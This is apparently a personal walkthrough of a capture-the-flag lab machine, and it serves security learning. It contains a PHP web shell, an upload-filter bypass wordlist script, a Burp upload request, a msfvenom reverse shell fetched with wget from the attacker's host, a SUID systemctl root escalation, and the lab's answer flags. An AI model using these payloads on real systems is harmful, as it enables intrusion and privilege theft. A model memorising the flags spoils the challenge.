[Reconnaissance]

[*] Target: 10.10.152.42

    # sudo nmap 10.10.152.42 -Pn -p- -g 53 --disable-arp-ping -O -A -sV -T 5 -v

        PORT     STATE SERVICE       VERSION
        21/tcp   open  ftp           vsftpd 3.0.3
        22/tcp   open  ssh           OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
        |   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
        |_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
        139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
        445/tcp  open  4.3.11-Ubuntu Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
        3128/tcp open  http-proxy    Squid http proxy 3.5.12
        |_http-title: ERROR: The requested URL could not be retrieved
        |_http-server-header: squid/3.5.12
        3333/tcp open  http          Apache httpd 2.4.18 ((Ubuntu))
        |_http-server-header: Apache/2.4.18 (Ubuntu)
        |_http-title: Vuln University
        Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%)
        Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

        Host script results:
        | smb2-security-mode: 
        |   3:1:1: 
        |_    Message signing enabled but not required
        | smb2-time: 
        |   date: 2023-07-07T00:05:15
        |_  start_date: N/A
        |_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
        | smb-os-discovery: 
        |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
        |   Computer name: vulnuniversity
        |   NetBIOS computer name: VULNUNIVERSITY\x00
        |   Domain name: \x00
        |   FQDN: vulnuniversity
        |_  System time: 2023-07-06T20:05:15-04:00
        | smb-security-mode: 
        |   account_used: guest
        |   authentication_level: user
        |   challenge_response: supported
        |_  message_signing: disabled (dangerous, but default)
        |_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s

[Question 1] Scan the box; how many ports are open? => 6

[Question 2] What version of the squid proxy is running on the machine? => 3.5.12

    [?] A Squid proxy is a widely used open-source proxy server that provides caching, forwarding, and access control for HTTP, HTTPS, FTP, and other protocols. 
        It acts as an intermediary between clients and servers, allowing clients to make requests to servers through the proxy 

[Question 3] How many ports will Nmap scan if the flag -p-400 was used? => 400

    [Note] Basically, -p-400 can be used to scan the first 400 ports like 1 to 400

[Question 4] What is the most likely operating system this machine is running? => Ubuntu

[Question 5] What port is the web server running on? => 3333

[Question 6] What is the flag for enabling verbose mode using Nmap? => -v


************************************************************************************************************************************************************************************************************************************************************


[Locating directories using Gobuster]

[*] Target: http://10.10.152.42:3333/

[Question 1] What is the directory that has an upload form page? => /internal/

    # ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u 'http://10.10.152.42:3333/FUZZ' -fs 33014

                /'___\  /'___\           /'___\       
               /\ \__/ /\ \__/  __  __  /\ \__/       
               \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                 \ \_\   \ \_\  \ \____/  \ \_\       
                  \/_/    \/_/   \/___/    \/_/       

            v2.0.0-dev
        ________________________________________________

        :: Method           : GET
        :: URL              : http://10.10.152.42:3333/FUZZ
        :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
        :: Follow redirects : false
        :: Calibration      : false
        :: Timeout          : 10
        :: Threads          : 40
        :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
        :: Filter           : Response size: 33014
        _________________________________________________________________________________

        [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 4885ms]
            * FUZZ: images

        [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 209ms]
            * FUZZ: css

        [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 210ms]
            * FUZZ: js

        [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 209ms]
            * FUZZ: fonts

        [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 210ms]
            * FUZZ: internal

    => I found that there is a upload page in the /internal/


************************************************************************************************************************************************************************************************************************************************************


[Compromise the Webserver]

[*] Target: http://10.10.152.42:3333/internal/

[Question 1] What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out. => .php

    [Step 1] Create payload and wordlist
    
        # echo '<?php system($_REQUEST['cmd']); ?>' >> shell.php

    [Step 2] Upload the payload

        => So after upload the shell.php, it shows me this "Extension not allowed"
    
        => .php is blocked

[Question 2] What extension is allowed? => .phtml

        [Note] Create a bash file to run the script below to have your wordlist

               I know you are wandering that "How can you have this!" Yeah! I do not folow the tryhackme's hint, this is my mindset

        for main_exten in 'jpg' 'png' 'gif'; do
            for char in '%20' '%0a' '%00' '%0d0a' '\x00' '%09' '/' '.\\' '.' '…' ':' '#'; do
                for ext in 'php' 'phps' 'php3' 'php4' 'php5' 'php7' 'php8' 'phar' 'phtml' 'phtm' 'pHtml' 'pHp' 'pHp3' 'pHp4' 'pHp5' 'phpt' 'htaccess' 'shtml' 'hphp' 'inc'; do
                    echo "$char.$ext.$main_exten" >> Bypass_extension.txt
                    echo ".$ext$char.$main_exten" >> Bypass_extension.txt
                    echo ".$main_exten$char.$ext" >> Bypass_extension.txt
                    echo ".$main_exten.$ext$char" >> Bypass_extension.txt
                    echo ".$main_exten.$ext" >> Bypass_extension.txt
                    echo ".$ext.$main_exten" >> Bypass_extension.txt
                    echo ".$ext" >> Bypass_extension.txt
                    echo ".$ext.$ext.$main_exten" >> Bypass_extension.txt
                done
            done
        done

    [+] Using burpsuite to find the available extension, I found that .phtml is the suitable one

        POST /internal/index.php HTTP/1.1
        Host: 10.10.152.42:3333
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Content-Type: multipart/form-data; boundary=---------------------------166703745616985357982160510087
        Content-Length: 379
        Origin: http://10.10.152.42:3333
        Connection: close
        Referer: http://10.10.152.42:3333/internal/
        Upgrade-Insecure-Requests: 1

        -----------------------------166703745616985357982160510087
        Content-Disposition: form-data; name="file"; filename="shell§.php§"
        Content-Type: application/x-php

        <?php system($_REQUEST[cmd]); ?>

        -----------------------------166703745616985357982160510087
        Content-Disposition: form-data; name="submit"

        Submit
        -----------------------------166703745616985357982160510087--

    [>>] There are many extensions are allowed, but all of them have ".phtml" at the end
        ...
        229	.jpg.phtml  => 723	
        231	.phtml  => 723	
        243	.jpg%0a.pHtml   => 723
        245	.jpg.pHtml  => 723
        ...

[Question 2] What is the name of the user who manages the webserver? => bill

[Question 3] What is the user flag? => 8bd7992fbe8a6ad22a63361004cfcedb 

        $ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u 'http://10.10.152.42:3333/internal/FUZZ' -fs 525

                /'___\  /'___\           /'___\       
               /\ \__/ /\ \__/  __  __  /\ \__/       
               \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                 \ \_\   \ \_\  \ \____/  \ \_\       
                  \/_/    \/_/   \/___/    \/_/       

            v2.0.0-dev
        ________________________________________________

        :: Method           : GET
        :: URL              : http://10.10.152.42:3333/internal/FUZZ
        :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
        :: Follow redirects : false
        :: Calibration      : false
        :: Timeout          : 10
        :: Threads          : 40
        :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
        :: Filter           : Response size: 525
        ________________________________________________

        [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 209ms]
            * FUZZ: uploads

        [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 210ms]
            * FUZZ: css

    [>>] http://10.10.152.42:3333/internal/uploads/shell.phtml?cmd=id => uid=33(www-data) gid=33(www-data) groups=33(www-data) 

    [>>] http://10.10.152.42:3333/internal/uploads/shell.phtml?cmd=cat%20/etc/passwd => ... bill:x:1000:1000:,,,:/home/bill:/bin/bash

    [>>] http://10.10.152.42:3333/internal/uploads/shell.phtml?cmd=find%20/%20-name%20%22*.txt%22%202%3E/dev/null%20|%20grep%20bill => /home/bill/user.txt 

    [>>] http://10.10.152.42:3333/internal/uploads/shell.phtml?cmd=cat%20/home/bill/user.txt => 8bd7992fbe8a6ad22a63361004cfcedb 


************************************************************************************************************************************************************************************************************************************************************


[Privilege Escalation]

[*] Target: http://10.10.152.42:3333/internal/uploads/shell.phtml?cmd=

[Question 1] On the system, search for all SUID files. Which file stands out? => a58ff8579f0a9270368d33a9966c7fd5

    [Fun Fact] In Linux, SUID (set owner userId upon execution) is a particular type of file permission given to a file. 
               SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

    [>>] http://10.10.152.42:3333/internal/uploads/shell.phtml?cmd=find%20/%20-type%20f%20-perm%20/4000%20-user%20root <=> find / -type f -perm /4000 -user root

        /usr/bin/newuidmap
        /usr/bin/chfn
        /usr/bin/newgidmap
        /usr/bin/sudo
        /usr/bin/chsh
        /usr/bin/passwd
        /usr/bin/pkexec
        /usr/bin/newgrp
        /usr/bin/gpasswd
        /usr/lib/snapd/snap-confine
        /usr/lib/policykit-1/polkit-agent-helper-1
        /usr/lib/openssh/ssh-keysign
        /usr/lib/eject/dmcrypt-get-device
        /usr/lib/squid/pinger
        /usr/lib/dbus-1.0/dbus-daemon-launch-helper
        /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
        /bin/su
        /bin/ntfs-3g
        /bin/mount
        /bin/ping6
        /bin/umount
        /bin/systemctl
        /bin/ping
        /bin/fusermount

    [>>] I think I found a little bit too much, but this is privilege escalation module so the only folder can give us the power is /bin/systemctl

    [Fun Fact] The SUID permission on /bin/systemctl allows regular users to execute certain systemctl commands with root privileges. 
               This is necessary because systemctl typically requires administrative privileges to manage system services.

    # In this case, I think we need a better shell like meterpreter

    msfvenom -p php/meterpreter/reverse_tcp LHOST=10.14.56.1 LPORT=4444 -f raw -o evil.php

    [>>] http://10.10.152.42:3333/internal/uploads/shell.phtml?cmd=wget http://10.14.56.1:8000/evil.php

    [>>] http://10.10.152.42:3333/internal/uploads/evil.php

        meterpreter > shell

        >>> TF=$(mktemp).service
        echo '[Service]
        Type=oneshot
        ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output.txt"
        [Install]
        WantedBy=multi-user.target' > $TF
        /bin/systemctl link $TF
        /bin/systemctl enable --now $TF
        Created symlink from /etc/systemd/system/tmp.BlSxbz90DQ.service to /tmp/tmp.BlSxbz90DQ.service.
        Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.BlSxbz90DQ.service to /tmp/tmp.BlSxbz90DQ.service.
        
        >>> cat /tmp/output.txt
        a58ff8579f0a9270368d33a9966c7fd5

    [Note] I found the script at https://gtfobins.github.io/gtfobins/systemctl/



